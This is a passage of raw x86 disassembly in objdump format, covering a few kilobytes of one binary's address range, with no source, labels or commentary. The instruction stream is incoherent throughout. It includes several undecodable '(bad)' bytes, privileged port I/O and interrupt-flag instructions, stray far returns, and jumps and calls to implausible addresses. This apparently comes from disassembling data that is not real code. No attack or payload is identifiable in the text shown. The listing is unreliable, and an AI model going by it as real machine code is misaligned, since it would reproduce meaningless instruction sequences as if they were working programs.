  405281:	e9 50 3d 5f cb       	jmp    0xcb9f8fd6
  405286:	fd                   	std
  405287:	0c 58                	or     $0x58,%al
  405289:	3f                   	aas
  40528a:	5f                   	pop    %edi
  40528b:	cb                   	lret
  40528c:	fd                   	std
  40528d:	0c d8                	or     $0xd8,%al
  40528f:	34 5f                	xor    $0x5f,%al
  405291:	c6                   	(bad)
  405292:	59                   	pop    %ecx
  405293:	6c                   	insb   (%dx),%es:(%edi)
  405294:	fa                   	cli
  405295:	05 ec 9a af c5       	add    $0xc5af9aec,%eax
  40529a:	b9 17 02 ba 38       	mov    $0x38ba0217,%ecx
  40529f:	f7 c2 5e 5d 9c 67    	test   $0x679c5d5e,%edx
  4052a5:	c1 7e 5d 9c          	sarl   $0x9c,0x5d(%esi)
  4052a9:	67 c1 15 ba          	rcll   $0xba,(%di)
  4052ad:	38 cf                	cmp    %cl,%bh
  4052af:	86 6b 75             	xchg   %ch,0x75(%ebx)
  4052b2:	71 9e                	jno    0x405252
  4052b4:	0d 37 eb e2 3c       	or     $0x3ce2eb37,%eax
  4052b9:	07                   	pop    %es
  4052ba:	ee                   	out    %al,(%dx)
  4052bb:	d2 c5                	rol    %cl,%ch
  4052bd:	79 0e                	jns    0x4052cd
  4052bf:	3c a4                	cmp    $0xa4,%al
  4052c1:	8b f3                	mov    %ebx,%esi
  4052c3:	1c 78                	sbb    $0x78,%al
  4052c5:	5c                   	pop    %esp
  4052c6:	17                   	pop    %ss
  4052c7:	e7 b9                	out    %eax,$0xb9
  4052c9:	f0 9c                	lock pushf
  4052cb:	2e ce                	cs into
  4052cd:	73 e1                	jae    0x4052b0
  4052cf:	65 35 ce 90 7f 26    	gs xor $0x267f90ce,%eax
  4052d5:	ba e1 3c f8 b3       	mov    $0xb3f83ce1,%edx
  4052da:	f0 00 d7             	lock add %dl,%bh
  4052dd:	b3 f3                	mov    $0xf3,%bl
  4052df:	e0 3d                	loopne 0x40531e
  4052e1:	e1 b5                	loope  0x405298
  4052e3:	e1 13                	loope  0x4052f8
  4052e5:	f6 7c f8 58          	idivb  0x58(%eax,%edi,8)
  4052e9:	78 2e                	js     0x405319
  4052eb:	7c c2                	jl     0x4052af
  4052ed:	9e                   	sahf
  4052ee:	0f 5f 06             	maxps  (%esi),%xmm0
  4052f1:	f3 63 b0 0f cc 0b b4 	repz arpl %esi,-0x4bf433f1(%eax)
  4052f8:	fc                   	cld
  4052f9:	f6 41 d4 02          	testb  $0x2,-0x2c(%ecx)
  4052fd:	2d bf 7d 60 5f       	sub    $0x5f607dbf,%eax
  405302:	a0 e5 b7 1f d2       	mov    0xd21fb7e5,%al
  405307:	16                   	push   %ss
  405308:	68 f9 ed 87 ec       	push   $0xec87edf9
  40530d:	05 5a 7e 17 40       	add    $0x40177e5a,%eax
  405312:	fe 02                	incb   (%edx)
  405314:	2d bf 0b 60 e9       	sub    $0xe9600bbf,%eax
  405319:	02 2d bf 0b c1 b1    	add    0xb1c10bbf,%ch
  40531f:	40                   	inc    %eax
  405320:	cb                   	lret
  405321:	ef                   	out    %eax,(%dx)
  405322:	42                   	inc    %edx
  405323:	a8 5e                	test   $0x5e,%al
  405325:	a0 e5 77 21 34       	mov    0x342177e5,%al
  40532a:	2e d0 f2             	cs shl $1,%dl
  40532d:	bb 08 36 2d d0       	mov    $0xd02d3608,%ebx
  405332:	f2 bb 08 3a 17 68    	repnz mov $0x68173a08,%ebx
  405338:	71 5e                	jno    0x405398
  40533a:	0c 8b                	or     $0x8b,%al
  40533c:	f3 b4 38             	repz mov $0x38,%ah
  40533f:	2f                   	das
  405340:	86 95 79 5a 9c 17    	xchg   %dl,0x179c5a79(%ebp)
  405346:	43                   	inc    %ebx
  405347:	65 9e                	gs sahf
  405349:	16                   	push   %ss
  40534a:	e7 25                	out    %eax,$0x25
  40534c:	50                   	push   %eax
  40534d:	97                   	xchg   %eax,%edi
  40534e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40534f:	c5 79 09             	lds    0x9(%ecx),%edi
  405352:	6c                   	insb   (%dx),%es:(%edi)
  405353:	cc                   	int3
  405354:	d3 e2                	shl    %cl,%edx
  405356:	bc 14 da f3 b4       	mov    $0xb4f3da14,%esp
  40535b:	38 2f                	cmp    %ch,(%edi)
  40535d:	85 ad 79 5a 9c 97    	test   %ebp,-0x6863a587(%ebp)
  405363:	41                   	inc    %ecx
  405364:	5f                   	pop    %edi
  405365:	9e                   	sahf
  405366:	16                   	push   %ss
  405367:	e7 65                	out    %eax,$0x65
  405369:	b0 2b                	mov    $0x2b,%al
  40536b:	4f                   	dec    %edi
  40536c:	8b f3                	mov    %ebx,%esi
  40536e:	32 18                	xor    (%eax),%bl
  405370:	ca d3 e2             	lret   $0xe2d3
  405373:	bc 1c f6 e6 69       	mov    $0x69e6f61c,%esp
  405378:	71 5e                	jno    0x4053d8
  40537a:	0e                   	push   %cs
  40537b:	17                   	pop    %ss
  40537c:	e4 a9                	in     $0xa9,%al
  40537e:	bd 7b ac e1 20       	mov    $0x20e1ac7b,%ebp
  405383:	5c                   	pop    %esp
  405384:	01 57 08             	add    %edx,0x8(%edi)
  405387:	ef                   	out    %eax,(%dx)
  405388:	b2 0c                	mov    $0xc,%dl
  40538a:	ee                   	out    %al,(%dx)
  40538b:	5d                   	pop    %ebp
  40538c:	2b bc 8f a2 b9 77 50 	sub    0x5077b9a2(%edi,%ecx,4),%edi
  405393:	78 1f                	js     0x4053b4
  405395:	5b                   	pop    %ebx
  405396:	b9 77 a7 f0 62       	mov    $0x62f0a777,%ecx
  40539b:	6d                   	insl   (%dx),%es:(%edi)
  40539c:	dc 7b 50             	fdivrl 0x50(%ebx)
  40539f:	78 e7                	js     0x405388
  4053a1:	c7                   	(bad)
  4053a2:	70 ef                	jo     0x405393
  4053a4:	b7 c2                	mov    $0xc2,%bh
  4053a6:	cb                   	lret
  4053a7:	89 e3                	mov    %esp,%ebx
  4053a9:	de ef                	fsubrp %st,%st(7)
  4053ab:	84 37                	test   %dh,(%edi)
  4053ad:	df 76 08             	fbstp  0x8(%esi)
  4053b0:	bd 97 84 b7 ca       	mov    $0xcab78497,%ebp
  4053b5:	16                   	push   %ss
  4053b6:	8b de                	mov    %esi,%ebx
  4053b8:	eb 79                	jmp    0x405433
  4053ba:	b2 97                	mov    $0x97,%dl
  4053bc:	3e 35 5c 09 ff 0e    	ds xor $0xeff095c,%eax
  4053c2:	7a 2b                	jp     0x4053ef
  4053c4:	4d                   	dec    %ebp
  4053c5:	57                   	push   %edi
  4053c6:	c1 fc 85             	sar    $0x85,%esp
  4053c9:	5a                   	pop    %edx
  4053ca:	9f                   	lahf
  4053cb:	5d                   	pop    %ebp
  4053cc:	0b 8b 16 6a 7d 76    	or     0x767d6a16(%ebx),%ecx
  4053d2:	2d ac 5c a8 f5       	sub    $0xf5a85cac,%eax
  4053d7:	d9 75 50             	fnstenv 0x50(%ebp)
  4053da:	b1 50                	mov    $0x50,%cl
  4053dc:	eb b3                	jmp    0x405391
  4053de:	eb a0                	jmp    0x405380
  4053e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4053e1:	a1 d6 67 d7 c3       	mov    0xc3d767d6,%eax
  4053e6:	86 85 5a 9f 5d 0f    	xchg   %al,0xf5d9f5a(%ebp)
  4053ec:	ed                   	in     (%dx),%eax
  4053ed:	0b b5 3e bb 01 b6    	or     -0x49fe44c2(%ebp),%esi
  4053f3:	2c d4                	sub    $0xd4,%al
  4053f5:	fa                   	cli
  4053f6:	ec                   	in     (%dx),%al
  4053f7:	06                   	push   %es
  4053f8:	f0 2e d4 fa          	lock cs aam $0xfa
  4053fc:	ec                   	in     (%dx),%al
  4053fd:	06                   	push   %es
  4053fe:	d8 b5 50 eb b3 5f    	fdivs  0x5fb3eb50(%ebp)
  405404:	42                   	inc    %edx
  405405:	60                   	pusha
  405406:	a1 d6 67 bf 84       	mov    0x84bf67d6,%eax
  40540b:	bd 0b d5 1c f8       	mov    $0xf81cd50b,%ebp
  405410:	fa                   	cli
  405411:	72 23                	jb     0x405436
  405413:	ec                   	in     (%dx),%al
  405414:	17                   	pop    %ss
  405415:	1e                   	push   %ds
  405416:	5f                   	pop    %edi
  405417:	5f                   	pop    %edi
  405418:	6e                   	outsb  %ds:(%esi),(%dx)
  405419:	84 2b                	test   %ch,(%ebx)
  40541b:	84 67 c0             	test   %ah,-0x40(%edi)
  40541e:	7e f9                	jle    0x405419
  405420:	15 5c 2b bc 08       	adc    $0x8bc2b5c,%eax
  405425:	5b                   	pop    %ebx
  405426:	34 7a                	xor    $0x7a,%al
  405428:	37                   	aaa
  405429:	0b 6f 15             	or     0x15(%edi),%ebp
  40542c:	be 85 dc 04 77       	mov    $0x7704dc85,%esi
  405431:	09 ef                	or     %ebp,%edi
  405433:	28 7c 0b b9          	sub    %bh,-0x47(%ebx,%ecx,1)
  405437:	09 1e                	or     %ebx,(%esi)
  405439:	5e                   	pop    %esi
  40543a:	a8 cd                	test   $0xcd,%al
  40543c:	97                   	xchg   %eax,%edi
  40543d:	83 f0 6c             	xor    $0x6c,%eax
  405440:	d0 ab 34 1d 84 4f    	shrb   $1,0x4f841d34(%ebx)
  405446:	74 3d                	je     0x405485
  405448:	71 2b                	jno    0x405475
  40544a:	7c a9                	jl     0x4053f5
  40544c:	eb 89                	jmp    0x4053d7
  40544e:	5b                   	pop    %ebx
  40544f:	01 f2                	add    %esi,%edx
  405451:	b5 9e                	mov    $0x9e,%ch
  405453:	f8                   	clc
  405454:	35 84 e4 6b 3d       	xor    $0x3d6be484,%eax
  405459:	f1                   	int1
  40545a:	6b b0 e6 6b 3d 71 1b 	imul   $0x1b,0x713d6be6(%eax),%esi
  405461:	24 e4                	and    $0xe4,%al
  405463:	6b 3d 71 1b 64 e6 6b 	imul   $0x6b,0xe6641b71,%edi
  40546a:	3d 71 3b e4 e4       	cmp    $0xe4e43b71,%eax
  40546f:	6b 3d 71 3b 14 e6 6b 	imul   $0x6b,0xe6143b71,%edi
  405476:	3d 71 3b 2c cf       	cmp    $0xcf2c3b71,%eax
  40547b:	d7                   	xlat   %ds:(%ebx)
  40547c:	7a e2                	jp     0x405460
  40547e:	0e                   	push   %cs
  40547f:	28 cb                	sub    %cl,%bl
  405481:	d7                   	xlat   %ds:(%ebx)
  405482:	7a e2                	jp     0x405466
  405484:	0e                   	push   %cs
  405485:	a8 c9                	test   $0xc9,%al
  405487:	57                   	push   %edi
  405488:	73 f8                	jae    0x405482
  40548a:	2a b3 d1 74 27 34    	sub    0x342774d1(%ebx),%dh
  405490:	e7 cb                	out    %eax,$0xcb
  405492:	a8 a3                	test   $0xa3,%al
  405494:	e1 4e                	loope  0x4054e4
  405496:	d8 16                	fcoms  (%esi)
  405498:	f4                   	hlt
  405499:	8e 36                	mov    (%esi),%?
  40549b:	dd 05 97 e4 6b 39    	fldl   0x396be497
  4054a1:	dc 07                	faddl  (%edi)
  4054a3:	57                   	push   %edi
  4054a4:	e7 6b                	out    %eax,$0x6b
  4054a6:	39 dc                	cmp    %ebx,%esp
  4054a8:	07                   	pop    %es
  4054a9:	37                   	aaa
  4054aa:	ea 72 b8 1f 6e d3 e5 	ljmp   $0xe5d3,$0x6e1fb872
  4054b1:	70 3f                	jo     0x4054f2
  4054b3:	dc af cb e1 01 18    	fsubrl 0x1801e1cb(%edi)
  4054b9:	d5 e5                	aad    $0xe5
  4054bb:	f0 00 3c a3          	lock add %bh,(%ebx,%eiz,4)
  4054bf:	cb                   	lret
  4054c0:	e1 41                	loope  0x405503
  4054c2:	78 51                	js     0x405515
  4054c4:	97                   	xchg   %eax,%edi
  4054c5:	c3                   	ret
  4054c6:	83 f0 27             	xor    $0x27,%eax
  4054c9:	5d                   	pop    %ebp
  4054ca:	0e                   	push   %cs
  4054cb:	0f c2 5f 74 39       	cmpps  $0x39,0x74(%edi),%xmm3
  4054d0:	3c 04                	cmp    $0x4,%al
  4054d2:	7f d3                	jg     0x4054a7
  4054d4:	e5 f0                	in     $0xf0,%eax
  4054d6:	10 7c 26 72          	adc    %bh,0x72(%esi,%eiz,1)
  4054da:	a8 c4                	test   $0xc4,%al
  4054dc:	b9 fb 30 7c 23       	mov    $0x237c30fb,%ecx
  4054e1:	bc 26 7c 6e 3e       	mov    $0x3e6e7c26,%esp
  4054e6:	0c f8                	or     $0xf8,%al
  4054e8:	92                   	xchg   %eax,%edx
  4054e9:	42                   	inc    %edx
  4054ea:	de 05 56 37 fc 06    	fiadds 0x6fc3756
  4054f0:	22 84 77 a5 75 13 7a 	and    0x7a1375a5(%edi,%esi,2),%al
  4054f7:	b1 05                	mov    $0x5,%cl
  4054f9:	5a                   	pop    %edx
  4054fa:	b6 8f                	mov    $0x8f,%dh
  4054fc:	40                   	inc    %eax
  4054fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4054fe:	d0 3b                	sarb   $1,(%ebx)
  405500:	62 7c 14 ea          	bound  %edi,-0x16(%esp,%edx,1)
  405504:	0b b4 6c 7f 0b 1b 0b 	or     0xb1b0b7f(%esp,%ebp,2),%esi
  40550b:	b4 6c                	mov    $0x6c,%ah
  40550d:	7f 0b                	jg     0x40551a
  40550f:	ce                   	into
  405510:	02 2d db c7 60 6b    	add    0x6b60c7db,%ch
  405516:	81 96 ed 63 70 7c 81 	adcl   $0xe3ed9681,0x7c7063ed(%esi)
  40551d:	96 ed e3 
  405520:	b0 bb                	mov    $0xbb,%al
  405522:	40                   	inc    %eax
  405523:	cb                   	lret
  405524:	f6 71 38             	divb   0x38(%ecx)
  405527:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405528:	40                   	inc    %eax
  405529:	cb                   	lret
  40552a:	f6 09 38             	testb  $0x38,(%ecx)
  40552d:	ab                   	stos   %eax,%es:(%edi)
  40552e:	40                   	inc    %eax
  40552f:	cb                   	lret
  405530:	f6 09 b8             	testb  $0xb8,(%ecx)
  405533:	a0 40 cb f6 09       	mov    0x9f6cb40,%al
  405538:	b8 b2 40 cb f6       	mov    $0xf6cb40b2,%eax
  40553d:	49                   	dec    %ecx
  40553e:	b8 ae 40 cb f6       	mov    $0xf6cb40ae,%eax
  405543:	49                   	dec    %ecx
  405544:	b8 a5 40 9b bb       	mov    $0xbb9b40a5,%eax
  405549:	4f                   	dec    %edi
  40554a:	c1 dd 05             	rcr    $0x5,%ebp
  40554d:	da dc                	fcmovu %st(4),%st
  40554f:	7d 0a                	jge    0x40555b
  405551:	7e 23                	jle    0x405576
  405553:	3c fe                	cmp    $0xfe,%al
  405555:	fc                   	cld
  405556:	7b 1a                	jnp    0x405572
  405558:	9e                   	sahf
  405559:	10 1e                	adc    %bl,(%esi)
  40555b:	7f fe                	jg     0x40555b
  40555d:	3d 0d cf 07 f3       	cmp    $0xf307cf0d,%eax
  405562:	63 f0                	arpl   %esi,%eax
  405564:	0c fc                	or     $0xfc,%al
  405566:	39 e8                	cmp    %ebp,%eax
  405568:	75 9a                	jne    0x405504
  40556a:	9e                   	sahf
  40556b:	01 56 a8             	add    %edx,-0x58(%esi)
  40556e:	65 fb                	gs sti
  405570:	1c 84                	sbb    $0x84,%al
  405572:	16                   	push   %ss
  405573:	6a d9                	push   $0xffffffd9
  405575:	3e 07                	ds pop %es
  405577:	31 85 5a b6 bf 87    	xor    %eax,-0x784049a6(%ebp)
  40557d:	c4 42 2d             	les    0x2d(%edx),%eax
  405580:	db df                	fcmovnu %st(7),%st
  405582:	43                   	inc    %ebx
  405583:	56                   	push   %esi
  405584:	a1 96 ed f3 90       	mov    0x90f3ed96,%eax
  405589:	5b                   	pop    %ebx
  40558a:	a8 65                	test   $0x65,%al
  40558c:	fb                   	sti
  40558d:	3c 2c                	cmp    $0x2c,%al
  40558f:	2a d4                	sub    %ah,%dl
  405591:	b2 7d                	mov    $0x7d,%dl
  405593:	01 56 14             	add    %edx,0x14(%esi)
  405596:	6a d9                	push   $0xffffffd9
  405598:	be 00 e5 85 5a       	mov    $0x5a85e500,%esi
  40559d:	b6 2f                	mov    $0x2f,%dh
  40559f:	40                   	inc    %eax
  4055a0:	6d                   	insl   (%dx),%es:(%edi)
  4055a1:	a1 96 ed 1f a0       	mov    0xa01fed96,%eax
  4055a6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4055a7:	50                   	push   %eax
  4055a8:	cb                   	lret
  4055a9:	f6 0f 70             	testb  $0x70,(%edi)
  4055ac:	5c                   	pop    %esp
  4055ad:	a1 9a 83 25 eb       	mov    0xeb25839a,%eax
  4055b2:	78 d3                	js     0x405587
  4055b4:	8b d0                	mov    %eax,%edx
  4055b6:	25 3c 7b d6 89       	and    $0x89d67b3c,%eax
  4055bb:	e8 79 0b b5 8c       	call   0x8cf56139
  4055c0:	5e                   	pop    %esi
  4055c1:	82 93 83 de 5b c6 97 	adcb   $0x97,-0x39a4217d(%ebx)
  4055c8:	e0 fa                	loopne 0x4055c4
  4055ca:	a0 f7 a9 e1 65       	mov    0x65e1a9f7,%al
  4055cf:	f8                   	clc
  4055d0:	ad                   	lods   %ds:(%esi),%eax
  4055d1:	2e bf 57 e0 77 ba    	cs mov $0xba77e057,%edi
  4055d7:	fc                   	cld
  4055d8:	5e                   	pop    %esi
  4055d9:	81 3f ea f2 7b 15    	cmpl   $0x157bf2ea,(%edi)
  4055df:	5e                   	pop    %esi
  4055e0:	d7                   	xlat   %ds:(%ebx)
  4055e1:	e5 f7                	in     $0xf7,%eax
  4055e3:	2a bc a3 cb ef 4f f0 	sub    -0xfb01035(%ebx,%eiz,4),%bh
  4055ea:	77 5d                	ja     0x405649
  4055ec:	7e 7f                	jle    0x40566d
  4055ee:	82 cf 75             	or     $0x75,%bh
  4055f1:	f9                   	stc
  4055f2:	bd 06 df e9 f2       	mov    $0xf2e9df06,%ebp
  4055f7:	7b 0d                	jnp    0x405606
  4055f9:	4c                   	dec    %esp
  4055fa:	45                   	inc    %ebp
  4055fb:	5a                   	pop    %edx
  4055fc:	7e af                	jle    0x4055ad
  4055fe:	41                   	inc    %ecx
  4055ff:	54                   	push   %esp
  405600:	91                   	xchg   %eax,%ecx
  405601:	96                   	xchg   %eax,%esi
  405602:	df eb                	fucomip %st(3),%st
  405604:	10 57 a4             	adc    %dl,-0x5c(%edi)
  405607:	e5 f7                	in     $0xf7,%eax
  405609:	3a a4 15 a9 19 f1 37 	cmp    0x37f119a9(%ebp,%edx,1),%ah
  405610:	86 37                	xchg   %dh,(%edi)
  405612:	60                   	pusha
  405613:	ae                   	scas   %es:(%edi),%al
  405614:	f0 f8                	lock clc
  405616:	1b c3                	sbb    %ebx,%eax
  405618:	1b 90 5f 24 73 38    	sbb    0x3873245f(%eax),%edx
  40561e:	c3                   	ret
  40561f:	f4                   	hlt
  405620:	67 a8 2c             	addr16 test $0x2c,%al
  405623:	d2 72 78             	shlb   %cl,0x78(%edx)
  405626:	0b ea                	or     %edx,%ebp
  405628:	8a b4 1c de 82 8d 45 	mov    0x458d82de(%esp,%ebx,1),%dh
  40562f:	5a                   	pop    %edx
  405630:	0e                   	push   %cs
  405631:	e3 d0                	jecxz  0x405603
  405633:	5e                   	pop    %esi
  405634:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405635:	e5 30                	in     $0x30,%eax
  405637:	0e                   	push   %cs
  405638:	5b                   	pop    %ebx
  405639:	8b b4 1c 0e 43 5f 91 	mov    -0x6ea0bcf2(%esp,%ebx,1),%esi
  405640:	96                   	xchg   %eax,%esi
  405641:	c3                   	ret
  405642:	61                   	popa
  405643:	d8 5d a4             	fcomps -0x5c(%ebp)
  405646:	e5 f0                	in     $0xf0,%eax
  405648:	17                   	pop    %ss
  405649:	18 2a                	sbb    %ch,(%edx)
  40564b:	d2 72 f8             	shlb   %cl,-0x8(%edx)
  40564e:	0b ec                	or     %esp,%ebp
  405650:	d5 e5                	aad    $0xe5
  405652:	f0 17                	lock pop %ss
  405654:	b8 40 97 c3 db       	mov    $0xdbc39740,%eax
  405659:	70 85                	jo     0x4055e0
  40565b:	2e 87 b7 e1 3a 11 75 	xchg   %esi,%cs:0x75113ae1(%edi)
  405662:	b5 c5                	mov    $0xc5,%ch
  405664:	0d ef c0 cd c2       	or     $0xc2cdc0ef,%eax
  405669:	6b b1 6c 42 ef 6e e1 	imul   $0xffffffe1,0x6eef426c(%ecx),%esi
  405670:	7d 85                	jge    0x4055f7
  405672:	cf                   	iret
  405673:	a3 77 e1 61 e1       	mov    %eax,0xe161e177
  405678:	cd c8                	int    $0xc8
  40567a:	8c 46 ef             	mov    %es,-0x11(%esi)
  40567d:	89 60 7e             	mov    %esp,0x7e(%eax)
  405680:	25 c6 f7 e0 90       	and    $0x90e0f7c6,%eax
  405685:	2e bf f7 e1 0d 5d    	cs mov $0x5d0de1f7,%edi
  40568b:	7e ef                	jle    0x40567c
  40568d:	c3                   	ret
  40568e:	bb ba fc 3e 80       	mov    $0x803efcba,%ebx
  405693:	8f                   	(bad)
  405694:	74 f9                	je     0x40568f
  405696:	7d 00                	jge    0x405698
  405698:	5f                   	pop    %edi
  405699:	e8 f2 fb 2b 7c       	call   0x7c6c5290
  40569e:	af                   	scas   %es:(%edi),%eax
  40569f:	cb                   	lret
  4056a0:	ef                   	out    %eax,(%dx)
  4056a1:	af                   	scas   %es:(%edi),%eax
  4056a2:	60                   	pusha
  4056a3:	59                   	pop    %ecx
  4056a4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4056a5:	e5 f7                	in     $0xf7,%eax
  4056a7:	37                   	aaa
  4056a8:	98                   	cwtl
  4056a9:	b1 48                	mov    $0x48,%cl
  4056ab:	cb                   	lret
  4056ac:	ef                   	out    %eax,(%dx)
  4056ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4056ae:	60                   	pusha
  4056af:	5f                   	pop    %edi
  4056b0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4056b1:	e5 f7                	in     $0xf7,%eax
  4056b3:	37                   	aaa
  4056b4:	48                   	dec    %eax
  4056b5:	5f                   	pop    %edi
  4056b6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4056b7:	e5 f7                	in     $0xf7,%eax
  4056b9:	21 64 2f d2          	and    %esp,-0x2e(%edi,%ebp,1)
  4056bd:	f2 fb                	repnz sti
  4056bf:	10 0a                	adc    %cl,(%edx)
  4056c1:	16                   	push   %ss
  4056c2:	69 f3 ec ef 50 1a    	imul   $0x1a50efec,%ebx,%esi
  4056c8:	f4                   	hlt
  4056c9:	3a 4d 7f             	cmp    0x7f(%ebp),%cl
  4056cc:	87 ce                	xchg   %ecx,%esi
  4056ce:	45                   	inc    %ebp
  4056cf:	5a                   	pop    %edx
  4056d0:	d4 9f                	aam    $0x9f
  4056d2:	40                   	inc    %eax
  4056d3:	f7 22                	mull   (%edx)
  4056d5:	2d ea 4f 60 60       	sub    $0x60604fea,%eax
  4056da:	91                   	xchg   %eax,%ecx
  4056db:	16                   	push   %ss
  4056dc:	f5                   	cmc
  4056dd:	3f                   	aas
  4056de:	60                   	pusha
  4056df:	70 91                	jo     0x405672
  4056e1:	16                   	push   %ss
  4056e2:	f5                   	cmc
  4056e3:	3f                   	aas
  4056e4:	e0 8c                	loopne 0x405672
  4056e6:	45                   	inc    %ebp
  4056e7:	5a                   	pop    %edx
  4056e8:	d4 9f                	aam    $0x9f
  4056ea:	c2 79 8b             	ret    $0x8b79
  4056ed:	b4 a8                	mov    $0xa8,%ah
  4056ef:	3f                   	aas
  4056f0:	85 4b 75             	test   %ecx,0x75(%ebx)
  4056f3:	51                   	push   %ecx
  4056f4:	ff 13                	call   *(%ebx)
  4056f6:	ae                   	scas   %es:(%edi),%al
  4056f7:	d1 45 fd             	roll   $1,-0x3(%ebp)
  4056fa:	4f                   	dec    %edi
  4056fb:	b8 51 17 f5 3f       	mov    $0x3ff51751,%eax
  405700:	e1 76                	loope  0x405778
  405702:	5d                   	pop    %ebp
  405703:	d4 9f                	aam    $0x9f
  405705:	c1 fd ba             	sar    $0xba,%ebp
  405708:	a8 3f                	test   $0x3f,%al
  40570a:	83 31 35             	xorl   $0x35,(%ecx)
  40570d:	ce                   	into
  40570e:	90                   	nop
  40570f:	97                   	xchg   %eax,%edi
  405710:	33 8f 37 fd 0b 9e    	xor    -0x61f402c9(%edi),%ecx
  405716:	11 de                	adc    %ebx,%esi
  405718:	fb                   	sti
  405719:	99                   	cltd
  40571a:	27                   	daa
  40571b:	a2 f7 52 30 87       	mov    %al,0x873052f7
  405720:	12 e3                	adc    %bl,%ah
  405722:	e7 70                	out    %eax,$0x70
  405724:	58                   	pop    %eax
  405725:	97                   	xchg   %eax,%edi
  405726:	c3                   	ret
  405727:	17                   	pop    %ss
  405728:	f0 57                	lock push %edi
  40572a:	5d                   	pop    %ebp
  40572b:	0e                   	push   %cs
  40572c:	5f                   	pop    %edi
  40572d:	c0 3f 75             	sarb   $0x75,(%edi)
  405730:	39 7c 09 5f          	cmp    %edi,0x5f(%ecx,%ecx,1)
  405734:	eb 72                	jmp    0x4057a8
  405736:	f8                   	clc
  405737:	12 0c 8b             	adc    (%ebx,%ecx,4),%cl
  40573a:	b5 1c                	mov    $0x1c,%ch
  40573c:	fe 0d e1 8b b5 1c    	decb   0x1cb58be1
  405742:	fe 0d 33 17 6b 39    	decb   0x396b1733
  405748:	7c 05                	jl     0x40574f
  40574a:	c9                   	leave
  40574b:	8b b5 1c be 82 59    	mov    0x5982be1c(%ebp),%esi
  405751:	8b b5 1c be 82 05    	mov    0x582be1c(%ebp),%esi
  405757:	8b b5 1c be 86 c5    	mov    -0x3a7941e4(%ebp),%esi
  40575d:	8b b5 1c be 86 55    	mov    0x5586be1c(%ebp),%esi
  405763:	8b 65 9c             	mov    -0x64(%ebp),%esp
  405766:	e7 99                	out    %eax,$0x99
  405768:	be 81 8e c5 5a       	mov    $0x5ac58e81,%esi
  40576d:	9c                   	pushf
  40576e:	df c3                	ffreep %st(3)
  405770:	f6 c5 5a             	test   $0x5a,%ch
  405773:	9c                   	pushf
  405774:	df 43 ff             	filds  -0x1(%ebx)
  405777:	62 2d ce 23 b0 67    	bound  %ebp,0x67b023ce
  40577d:	b1 16                	mov    $0x16,%cl
  40577f:	e7 11                	out    %eax,$0x11
  405781:	38 5d 17             	cmp    %bl,0x17(%ebp)
  405784:	27                   	daa
  405785:	b0 73                	mov    $0x73,%al
  405787:	75 71                	jne    0x4057fa
  405789:	02 bb 44 17 27 63    	add    0x63271744(%ebx),%bh
  40578f:	57                   	push   %edi
  405790:	eb e2                	jmp    0x405774
  405792:	64 ec                	fs in  (%dx),%al
  405794:	97                   	xchg   %eax,%edi
  405795:	ba 38 19 bb 4d       	mov    $0x4dbb1938,%edx
  40579a:	17                   	pop    %ss
  40579b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40579c:	c2 ee d3             	ret    $0xd3ee
  40579f:	c5 a9 b0 51 35 ce    	lds    -0x31caae50(%ecx),%ebp
  4057a5:	90                   	nop
  4057a6:	ad                   	lods   %ds:(%esi),%eax
  4057a7:	d1 97 99 0c ec 69    	rcll   $1,0x69ec0c99(%edi)
  4057ad:	e1 ed                	loope  0x40579c
  4057af:	89 be 1a bd 17 17    	mov    %edi,0x1717bd1a(%esi)
  4057b5:	6b 77 87 91          	imul   $0xffffff91,-0x79(%edi),%esi
  4057b9:	fd                   	std
  4057ba:	69 b1 76 77 18 d9 5f 	imul   $0x6a97845f,-0x26e7888a(%ecx),%esi
  4057c1:	84 97 6a 
  4057c4:	e9 52 4c ec 6f       	jmp    0x702ca41b
  4057c9:	c2 9b 6f             	ret    $0x6f9b
  4057cc:	31 81 89 7d 16 cc    	xor    %eax,-0x33e98277(%ecx)
  4057d2:	fd                   	std
  4057d3:	06                   	push   %es
  4057d4:	93                   	xchg   %eax,%ebx
  4057d5:	99                   	cltd
  4057d6:	c5 17                	lds    (%edi),%edx
  4057d8:	4b                   	dec    %ebx
  4057d9:	ef                   	out    %eax,(%dx)
  4057da:	16                   	push   %ss
  4057db:	53                   	push   %ebx
  4057dc:	28 6b 29             	sub    %ch,0x29(%ebx)
  4057df:	d6                   	salc
  4057e0:	7a 62                	jp     0x405844
  4057e2:	06                   	push   %es
  4057e3:	3b b6 58 eb 89 19    	cmp    0x1989eb58(%esi),%esi
  4057e9:	ac                   	lods   %ds:(%esi),%al
  4057ea:	ab                   	stos   %eax,%es:(%edi)
  4057eb:	58                   	pop    %eax
  4057ec:	eb 89                	jmp    0x405777
  4057ee:	68 d6 5b ac f5       	push   $0xf5ac5bd6
  4057f3:	44                   	inc    %esp
  4057f4:	34 db                	xor    $0xdb,%al
  4057f6:	59                   	pop    %ecx
  4057f7:	ac                   	lods   %ds:(%esi),%al
  4057f8:	f5                   	cmc
  4057f9:	84 95 9d 5c ac f5    	test   %dl,-0xa53a363(%ebp)
  4057ff:	84 95 9d 59 ac f5    	test   %dl,-0xa53a663(%ebp)
  405805:	44                   	inc    %esp
  405806:	0c db                	or     $0xdb,%al
  405808:	57                   	push   %edi
  405809:	ac                   	lods   %ds:(%esi),%al
  40580a:	f5                   	cmc
  40580b:	44                   	inc    %esp
  40580c:	0c bb                	or     $0xbb,%al
  40580e:	ac                   	lods   %ds:(%esi),%al
  40580f:	58                   	pop    %eax
  405810:	eb 89                	jmp    0x40579b
  405812:	18 36                	sbb    %dh,(%esi)
  405814:	52                   	push   %edx
  405815:	ac                   	lods   %ds:(%esi),%al
  405816:	f5                   	cmc
  405817:	84 8d dd 54 ac f5    	test   %cl,-0xa53ab23(%ebp)
  40581d:	84 8d dd a9 c6 19    	test   %cl,0x19c6a9dd(%ebp)
  405823:	e2 c9                	loop   0x4057ee
  405825:	ea 52 66 b2 07 85 b7 	ljmp   $0xb785,$0x7b26652
  40582c:	23 cb                	and    %ebx,%ecx
